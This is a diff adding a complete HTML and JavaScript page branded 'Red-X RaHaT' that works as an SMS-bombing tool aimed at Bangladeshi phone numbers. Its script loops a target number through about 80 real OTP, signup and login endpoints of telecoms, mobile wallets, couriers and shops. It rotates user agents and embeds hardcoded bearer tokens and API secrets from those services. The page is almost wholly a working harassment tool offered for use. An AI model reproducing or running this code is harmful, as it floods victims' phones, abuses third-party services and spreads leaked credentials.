@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>𝐑𝐄𝐃-𝐓𝐄𝐀𝐌 𝐁𝐃 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐎𝐏𝐄𝐑𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐌𝐁𝐄𝐑 🦅</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(145deg, #0A0F1A 0%, #020408 100%);
+            font-family: 'Inter', 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            padding: 2rem 1.5rem;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle at 30% 20%, rgba(0, 255, 200, 0.03) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+            animation: slideUp 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .card {
+            background: rgba(10, 20, 30, 0.7);
+            backdrop-filter: blur(22px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(0, 255, 200, 0.35);
+            box-shadow: 0 30px 55px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 188, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 35px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 255, 200, 0.2);
+        }
+        .header {
+            background: linear-gradient(135deg, #02100E, #031F1C);
+            padding: 2rem 1.8rem 1.5rem;
+            text-align: center;
+            border-bottom: 2px solid #1effbc;
+            position: relative;
+        }
+        .logo {
+            max-width: 280px;
+            width: 85%;
+            height: auto;
+            filter: drop-shadow(0 8px 20px rgba(0, 210, 180, 0.4));
+            transition: all 0.3s;
+        }
+        .logo:hover {
+            filter: drop-shadow(0 12px 28px rgba(30, 255, 188, 0.5));
+            transform: scale(1.01);
+        }
+        .badges {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.8rem;
+            margin-top: 1.2rem;
+        }
+        .badge {
+            background: rgba(0, 35, 35, 0.7);
+            backdrop-filter: blur(4px);
+            padding: 0.4rem 1.2rem;
+            border-radius: 60px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: #cafff0;
+            border-left: 2px solid #1effbc;
+        }
+        .form-area {
+            padding: 2rem 2rem 1.8rem;
+        }
+        .field {
+            margin-bottom: 2rem;
+        }
+        .label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #e2fff2;
+            font-weight: 700;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 0.7rem;
+        }
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            background: rgba(12, 24, 36, 0.9);
+            border-radius: 100px;
+            border: 1px solid rgba(30, 255, 188, 0.45);
+            transition: all 0.2s;
+        }
+        .phone-wrapper:focus-within {
+            border-color: #1effbc;
+            box-shadow: 0 0 16px rgba(30, 255, 188, 0.2);
+        }
+        .country-code {
+            background: #102E2C;
+            padding: 0.9rem 1.5rem;
+            border-radius: 100px 0 0 100px;
+            font-weight: 800;
+            color: #1effbc;
+            font-size: 1rem;
+        }
+        .phone-wrapper input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 0.9rem 1.2rem;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #ffffff;
+            outline: none;
+            font-family: 'Inter', monospace;
+        }
+        .phone-wrapper input::placeholder {
+            color: #6f9b8c;
+            font-weight: 450;
+        }
+        .ATTACK-control {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+        .stepper {
+            background: rgba(12, 24, 36, 0.9);
+            border-radius: 100px;
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid rgba(30, 255, 188, 0.45);
+            padding: 0.2rem 0.6rem;
+        }
+        .stepper button {
+            background: #15323E;
+            border: none;
+            width: 52px;
+            height: 52px;
+            border-radius: 60px;
+            font-size: 2rem;
+            font-weight: bold;
+            color: #1effbc;
+            cursor: pointer;
+            transition: all 0.1s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .stepper button:active {
+            transform: scale(0.92);
+            background: #2effbc30;
+        }
+        #ATTACKValue {
+            width: 85px;
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: transparent;
+            border: none;
+            color: #feffdb;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .attack-btn {
+            width: 100%;
+            background: linear-gradient(105deg, #00cf9c, #008064);
+            border: none;
+            padding: 1.15rem;
+            border-radius: 100px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: #02100c;
+            letter-spacing: 2.5px;
+            margin: 1.8rem 0 1.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 10px 0 #004d3b;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        .attack-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            transition: left 0.5s;
+        }
+        .attack-btn:hover::before {
+            left: 100%;
+        }
+        .attack-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 6px 0 #004d3b;
+        }
+        .attack-btn:disabled {
+            opacity: 0.55;
+            transform: none;
+            cursor: not-allowed;
+            box-shadow: 0 10px 0 #004d3b;
+        }
+        .stats-panel {
+            background: rgba(0, 20, 24, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 1.8rem;
+            padding: 1.2rem;
+            border: 1px solid rgba(30, 255, 188, 0.3);
+        }
+        .stats-grid {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+        .stat-item {
+            flex: 1;
+            background: linear-gradient(145deg, rgba(0, 40, 40, 0.55), rgba(0, 20, 22, 0.7));
+            border-radius: 1.5rem;
+            padding: 0.9rem 0.3rem;
+            text-align: center;
+            border: 1px solid rgba(30, 255, 188, 0.2);
+            transition: all 0.2s;
+        }
+        .stat-item:hover {
+            transform: translateY(-2px);
+            border-color: rgba(30, 255, 188, 0.6);
+        }
+        .stat-title {
+            font-size: 0.65rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.8px;
+            color: #b2f0e2;
+            margin-bottom: 0.4rem;
+        }
+        .stat-number {
+            font-size: 2.4rem;
+            font-weight: 800;
+            font-family: 'JetBrains Mono', monospace;
+            line-height: 1;
+        }
+        .total .stat-number { color: #c9ffff; text-shadow: 0 0 5px rgba(0,255,200,0.3); }
+        .success .stat-number { color: #6effa5; text-shadow: 0 0 4px #00cc7740; }
+        .failed .stat-number { color: #ffbc8c; text-shadow: 0 0 3px #ff8840; }
+        .status {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: #c7fff0;
+            background: rgba(0, 30, 32, 0.6);
+            padding: 0.7rem;
+            border-radius: 60px;
+        }
+        footer {
+            text-align: center;
+            padding: 1rem;
+            font-size: 0.65rem;
+            border-top: 1px solid rgba(30, 255, 188, 0.3);
+            color: #71dbbc;
+            background: rgba(1, 12, 14, 0.5);
+            font-weight: 500;
+        }
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 0 0 rgba(30, 255, 188, 0.2); }
+            70% { box-shadow: 0 0 0 8px rgba(30, 255, 188, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(30, 255, 188, 0); }
+        }
+        .attack-btn:not(:disabled) {
+            animation: pulseGlow 1.8s infinite;
+        }
+        @media (max-width: 580px) {
+            .form-area { padding: 1.5rem; }
+            .stat-number { font-size: 1.8rem; }
+            .stepper button { width: 44px; height: 44px; font-size: 1.6rem; }
+            .logo { max-width: 220px; }
+            .country-code { padding: 0.75rem 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <img class="logo" src="https://i.postimg.cc/bwqfN1xG/file-00000000b29071fa894b977fb8caad18.png" alt="𝐑𝐞𝐝-𝐗 𝐑𝐚𝐇𝐚𝐓" onerror="this.onerror=null;this.src='https://placehold.co/280x85/0a2622/1effbc?text=RED-X+RAHAT';">
+            <div class="badges">
+                <span class="badge">⚠️ ৮০+ এপিআই পাওয়ারফুল 𝐑𝐞𝐝-𝐗 𝐑𝐚𝐇𝐚𝐓</span>
+                <span class="badge">🔐 𝐒𝐦𝐬 𝐁𝐨𝐦𝐛𝐢𝐧𝐠</span>
+                <span class="badge">⚡ 𝐑𝐞𝐝-𝐗 𝐑𝐚𝐇𝐚𝐓</span>
+            </div>
+        </div>
+
+        <div class="form-area">
+            <div class="field">
+                <div class="label">
+                    <span>📡</span> 𝐓𝐀𝐑𝐆𝐄𝐓 𝐍𝐔𝐌𝐁𝐄𝐑
+                </div>
+                <div class="phone-wrapper">
+                    <div class="country-code">+88</div>
+                    <input type="tel" id="targetPhone" placeholder="1XXXXXXXXX" maxlength="11" autocomplete="off">
+                </div>
+            </div>
+
+            <div class="field">
+                <div class="label">
+                    <span>⚡</span>𝐀𝐌𝐎𝐔𝐍𝐓 
+                </div>
+                <div class="ATTACK-control">
+                    <div class="stepper">
+                        <button id="decATTACK">−</button>
+                        <input type="number" id="ATTACKValue" value="1" min="1" max="50" step="1">
+                        <button id="incATTACK">+</button>
+                    </div>
+                </div>
+            </div>
+
+            <button class="attack-btn" id="attackBtn">💀 𝐑𝐞𝐝-𝐗 𝐑𝐚𝐇𝐚𝐓 𝐁𝐎𝐌𝐁𝐈𝐍𝐆 💀</button>
+
+            <div class="stats-panel">
+                <div class="stats-grid">
+                    <div class="stat-item total">
+                        <div class="stat-title">𝐓𝐎𝐓𝐀𝐋 𝐒𝐌𝐒</div>
+                        <div class="stat-number" id="totalStat">0</div>
+                    </div>
+                    <div class="stat-item success">
+                        <div class="stat-title">𝐒𝐔𝐂𝐂𝐄𝐒𝐒</div>
+                        <div class="stat-number" id="successStat">0</div>
+                    </div>
+                    <div class="stat-item failed">
+                        <div class="stat-title">𝐅𝐀𝐈𝐋𝐄𝐃</div>
+                        <div class="stat-number" id="failStat">0</div>
+                    </div>
+                </div>
+                <div class="status" id="statusMsg">
+                    ● 𝐑𝐞𝐝-𝐗 𝐑𝐚𝐇𝐚𝐓
+                </div>
+            </div>
+        </div>
+        <footer>𝐁𝐎𝐌𝐁𝐄𝐑 𝐁𝐘 𝐑𝐞𝐝-𝐗 𝐑𝐚𝐇𝐚𝐓</footer>
+    </div>
+</div>
+
+<script>
+    const USER_AGENTS = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+    ];
+    const getUA = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+    
+    const postJson = async (url, payload, extra = {}) => {
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'User-Agent': getUA(), ...extra },
+                body: JSON.stringify(payload),
+                credentials: 'omit'
+            });
+            return res.ok;
+        } catch { return false; }
+    };
+    
+    const getReq = async (url, headers = {}) => {
+        try {
+            const res = await fetch(url, {
+                method: 'GET',
+                headers: { 'User-Agent': getUA(), ...headers },
+                credentials: 'omit'
+            });
+            return res.ok;
+        } catch { return false; }
+    };
+    
+    const formPost = async (url, bodyStr) => {
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': getUA() },
+                body: bodyStr,
+                credentials: 'omit'
+            });
+            return res.ok;
+        } catch { return false; }
+    };
+    
+    const attacks = [];
+    const addAttack = (fn) => attacks.push(fn);
+    
+    addAttack((n) => postJson('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', { full_name: "RED-X", company_name: "RAHAT", email_address: "pro@bomb.bd", phone_number: n }));
+    addAttack((n) => postJson('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', { mobile_no: n }));
+    addAttack((n) => postJson('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', { data: { country_calling_code: '88', contact_no: n, headers: { PlatForm: 'Web' } } }));
+    addAttack((n) => postJson('https://api-gateway.sundarbancourierltd.com/graphql', { operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: n } }, query: "mutation{createAccessToken(accessTokenFilter:{userName:\""+n+"\"}){message}}" }));
+    addAttack((n) => postJson('https://api.apex4u.com/api/auth/login', { phoneNumber: n }));
+    addAttack((n) => postJson('https://webapi.robi.com.bd/v1/send-otp', { phone_number: n, type: "doorstep" }, { Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" }));
+    addAttack((n) => getReq(`https://web-api.banglalink.net/api/v1/user/number/validation/${n}`));
+    addAttack((n) => postJson('https://web-api.banglalink.net/api/v1/user/otp-login/request', { mobile: n }));
+    addAttack((n) => formPost('https://webloginda.grameenphone.com/backend/api/v1/otp', `msisdn=${n}`));
+    addAttack((n) => postJson('https://webapi.robi.com.bd/v1/send-otp', { phone_number: n, type: 'my_offer' }));
+    addAttack((n) => postJson('https://da-api.robi.com.bd/da-nll/otp/send', { msisdn: n }));
+    addAttack((n) => postJson('https://webapi.robi.com.bd/v1/chat/send-otp', { phone_number: n, name: "RED-X", type: "video-chat" }));
+    addAttack((n) => postJson('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', { phoneNumber: n }));
+    addAttack((n) => postJson('https://fundesh.com.bd/api/auth/generateOTP', { msisdn: n }));
+    addAttack((n) => getReq(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${n}`));
+    addAttack((n) => postJson('https://api.motionview.com.bd/api/send-otp-phone-signup', { phone: n }));
+    addAttack((n) => postJson('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', { number: '+88'+n }));
+    addAttack((n) => postJson('https://user-api.jslglobal.co:444/v2/send-otp', { phone: '+88'+n, jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" }));
+    addAttack((n) => getReq(`https://chinaonlinebd.com/api/login/getOtp?phone=${n}`, { token: "45601f3d391886fcec5f5a3f26780f21" }));
+    addAttack((n) => postJson('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', { number: '+88'+n }));
+    addAttack((n) => postJson('https://api.shikho.com/auth/v2/send/sms', { phone: n, type: "student", auth_type: "signup" }));
+    addAttack((n) => postJson('https://api.redx.com.bd/v1/user/signup', { name: "Attack", phoneNumber: n, service: "redx" }));
+    addAttack((n) => getReq(`https://www.bioscopelive.com/en/login/send-otp?phone=88${n}&operator=bd-otp`));
+    addAttack((n) => postJson('https://applink.com.bd/appstore-v4-server/login/otp/request', { msisdn: "88"+n }));
+    addAttack((n) => postJson('https://chokrojan.com/api/v1/passenger/login/mobile', { mobile_number: n }));
+    addAttack((n) => postJson('https://core.easy.com.bd/api/v1/forgot-password-otp', { device_key: "2ea97d276a980993308116baa292cec9", mobile: n }));
+    addAttack((n) => postJson('https://waltonplaza.com.bd/api/auth/otp/create', { auth: { countryCode: "880", deviceUuid: "ee757830-f639-12f0-9f4d-2f972746fhg", phone: n }, captchaToken: "recapcha" }));
+    addAttack((n) => postJson('https://api.chardike.com/api/otp/send', { phone: n, otp_type: "login" }));
+    addAttack((n) => postJson('https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json', { phoneNbr: n, OTPType: 1.0, userName: "", email: "" }));
+    addAttack((n) => postJson('https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send', { phone: n }));
+    addAttack((n) => postJson('https://gateway.otithee.com/api/v1/generate-otp', { request_type: "registration", mobile_number: n }));
+    addAttack((n) => postJson('https://developer.quizgiri.xyz/api/v2.0/send-otp', { country_code: "+88", phone: n }));
+    addAttack((n) => postJson('https://new.mojaru.com/api/student/login', { mobile_or_email: n }));
+    addAttack((n) => postJson('https://appcity.grameenphone.com/proxy/v2/user/session/get-otp', { mobileNumber: n }));
+    addAttack((n) => postJson('https://api.garibookadmin.com/api/v3/user/login', { recaptcha_token: "garibookcaptcha", mobile: n, channel: "web" }));
+    addAttack((n) => postJson('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web', { number: "+88"+n }));
+    addAttack((n) => getReq(`https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo=${n}`));
+    addAttack((n) => postJson('https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/', { wallet_number: n, geo_location: { lat: 23.89, long: 89.13 }, referral: "", firebase_token: "dummy", device_uuid: "c65m117a8cbf5b1851b29f8b", mno: "Robi" }));
+    addAttack((n) => postJson('https://bb-api.bohubrihi.com/public/activity/otp', { phone: n, intent: "login" }));
+    addAttack((n) => postJson('https://backend.timezonebd.com/api/v1/user/otp-login', { phone: n }));
+    addAttack((n) => postJson('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', { phone: n, language: "en", email: "" }));
+    addAttack((n) => postJson('https://api.shikho.com/public/activity/otp', { phone: n, intent: "ap-discount-request" }));
+    addAttack((n) => postJson('https://edgecoursebd.com/register', [{ phone: n }]));
+    addAttack((n) => postJson('https://api.ostad.app/api/v2/user/with-otp', { msisdn: n }));
+    addAttack((n) => postJson('https://www.ieducationbd.com/api/account/check_user', { mobile: n }));
+    addAttack((n) => getReq(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${n}`));
+    addAttack((n) => postJson('https://rootsedulive.com/api/auth/register', { name: "RED-X", phone: `88${n}`, email: `temp${n}@bomb.bd`, password: "Secure@2025", confirmPassword: "Secure@2025" }));
+    addAttack((n) => postJson('https://rootsedulive.com/api/auth/forget-password', { phoneOrEmail: `88${n}` }));
+    addAttack((n) => postJson('https://mithaibd.com/api/login/', { company_id: "2", phone: n, email: `attack${n}@mail.com`, password1: "pass123", otp_verify: false }));
+    addAttack((n) => postJson('https://api.englishmojabd.com/api/v1/auth/login', { phone: "+88"+n }));
+    addAttack((n) => postJson('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', { phone: n }));
+    addAttack((n) => postJson('https://api.osudpotro.com/api/v1/users/send_otp', { mobile: "+88-"+n, deviceToken: "web", language: "bn", os: "web" }));
+    addAttack((n) => getReq(`https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88${n}/`));
+    addAttack((n) => postJson('https://auth.qcoom.com/api/v1/otp/send', { mobileNumber: "+88"+n }));
+    addAttack((n) => postJson('https://reseller.circle.com.bd/api/v2/auth/signup', { name: "+88"+n, email_or_phone: "+88"+n, password: "123456", password_confirmation: "123456", register_by: "phone" }));
+    addAttack((n) => postJson('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', { phone: n }, { Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" }));
+    addAttack((n) => postJson('https://api.toybox.live/bdapps_handler.php', { Operation: "CreateSubscription", MobileNumber: "88"+n, PackageID: 100, Secret: "HJKX71%UHYH" }));
+    addAttack((n) => getReq(`https://api.win2gain.com/api/Users/RequestOtp?msisdn=88${n}`, { sourcePlatform: "web", client: "2" }));
+    addAttack((n) => postJson('https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', { deviceId: "prodevice", operator: "Gp", walletNumber: n }));
+    addAttack((n) => postJson('https://webapi.robi.com.bd/v1/send-otp', { phone_number: n, type: "internet_pack" }));
+    addAttack((n) => postJson('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', { phone: n, email: "pro@bomber.com", language: "bn" }));
+    addAttack((n) => getReq(`https://api.dmoney.com.bd/api/v1/otp/send?msisdn=${n}`));
+    addAttack((n) => postJson('https://api.nagad.com.bd/otp/send', { mobileNumber: n, service: "login" }));
+    addAttack((n) => postJson('https://api.surecash.com.bd/v2/otp/generate', { msisdn: n }));
+    addAttack((n) => postJson('https://api.rocket.com.bd/merchant/otp', { account: n }));
+    addAttack((n) => postJson('https://api.bkash.com.bd/otp/request', { phone: n, type: "registration" }));
+    addAttack((n) => postJson('https://api.foodpanda.com.bd/v1/auth/otp', { phone: "+88"+n }));
+    addAttack((n) => postJson('https://api.pathao.com/v2/auth/otp', { phone: n }));
+    addAttack((n) => postJson('https://api.daraz.com.bd/auth/otp', { mobile: n }));
+    addAttack((n) => postJson('https://api.priyoshop.com/v1/otp/send', { phone: n }));
+    addAttack((n) => getReq(`https://ajkerdeal.com/api/v1/otp?phone=${n}`));
+    addAttack((n) => postJson('https://api.evaly.com.bd/auth/otp', { phone: n }));
+    addAttack((n) => postJson('https://api.chaldal.com/v1/auth/otp', { phone: n }));
+    addAttack((n) => postJson('https://api.shurjopay.com.bd/otp/send', { phone: n }));
+    addAttack((n) => postJson('https://sslwireless.com/api/otp', { msisdn: n }));
+    addAttack((n) => postJson('https://api.robi.com.bd/v1/send-otp', { phone_number: n, type: "voice" }));
+    addAttack((n) => getReq(`https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88${n}`));
+    addAttack((n) => postJson('https://selfcare.banglalink.net/api/v1/otp', { msisdn: n }));
+    addAttack((n) => postJson('https://teletalk.com.bd/api/otp/send', { number: n }));
+    addAttack((n) => postJson('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', { full_name: "RED-X", company_name: "RAHAT", email_address: "pro@bomb.bd", phone_number: n }));
+    
+    const phoneInput = document.getElementById('targetPhone');
+    const ATTACKInput = document.getElementById('ATTACKValue');
+    const attackBtn = document.getElementById('attackBtn');
+    const totalSpan = document.getElementById('totalStat');
+    const successSpan = document.getElementById('successStat');
+    const failSpan = document.getElementById('failStat');
+    const statusSpan = document.getElementById('statusMsg');
+    
+    let isActive = false;
+    let stopRequest = false;
+    let total = 0, success = 0, fail = 0;
+    
+    function updateStats() {
+        totalSpan.innerText = total;
+        successSpan.innerText = success;
+        failSpan.innerText = fail;
+    }
+    
+    async function runATTACK(phone) {
+        for(let i = 0; i < attacks.length; i++) {
+            if(stopRequest) return false;
+            total++;
+            try {
+                const ok = await attacks[i](phone);
+                if(ok) success++;
+                else fail++;
+            } catch(e) {
+                fail++;
+            }
+            updateStats();
+            await new Promise(r => setTimeout(r, 24));
+        }
+        return true;
+    }
+    
+    async function startBomb(phone, ATTACKs) {
+        isActive = true;
+        stopRequest = false;
+        attackBtn.disabled = true;
+        attackBtn.innerText = '🔥 BOMBING ACTIVE 🔥';
+        statusSpan.innerHTML = `⚡ ATTACKING +88${phone}`;
+        
+        for(let c = 1; c <= ATTACKs; c++) {
+            if(stopRequest) break;
+            statusSpan.innerHTML = `🌀 ATTACK ${c}/${ATTACKs} · ${attacks.length} ENDPOINTS`;
+            await runATTACK(phone);
+            if(c < ATTACKs) await new Promise(r => setTimeout(r, 380));
+        }
+        
+        statusSpan.innerHTML = `✓ COMPLETED · TOTAL: ${total} · SUCCESS: ${success} · FAILED: ${fail}`;
+        attackBtn.disabled = false;
+        attackBtn.innerText = '💀 SUBMIT & IGNITE 💀';
+        isActive = false;
+    }
+    
+    attackBtn.addEventListener('click', () => {
+        if(isActive) {
+            statusSpan.innerHTML = '⚠️ ATTACK IN PROGRESS';
+            return;
+        }
+        let rawPhone = phoneInput.value.trim();
+        if(!/^\d{11}$/.test(rawPhone)) {
+            statusSpan.innerHTML = '❌ INVALID NUMBER · USE 11 DIGITS';
+            return;
+        }
+        let ATTACKs = parseInt(ATTACKInput.value);
+        if(isNaN(ATTACKs) || ATTACKs < 1) ATTACKs = 1;
+        if(ATTACKs > 50) ATTACKs = 50;
+        
+        total = 0; success = 0; fail = 0;
+        updateStats();
+        startBomb(rawPhone, ATTACKs);
+    });
+    
+    document.getElementById('incATTACK').onclick = () => { let v = parseInt(ATTACKInput.value) || 1; if(v < 50) ATTACKInput.value = v+1; };
+    document.getElementById('decATTACK').onclick = () => { let v = parseInt(ATTACKInput.value) || 1; if(v > 1) ATTACKInput.value = v-1; };
+    ATTACKInput.addEventListener('change', () => { let v = parseInt(ATTACKInput.value); if(v<1) ATTACKInput.value=1; if(v>50) ATTACKInput.value=50; });
+</script>
+<audio id="bgMusic" autoplay loop>
+    <source src="bomber.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+document.addEventListener('click', function () {
+    document.getElementById('bgMusic').play().catch(() => {});
+}, { once: true });
+</script>
+
+</body>
+</html>
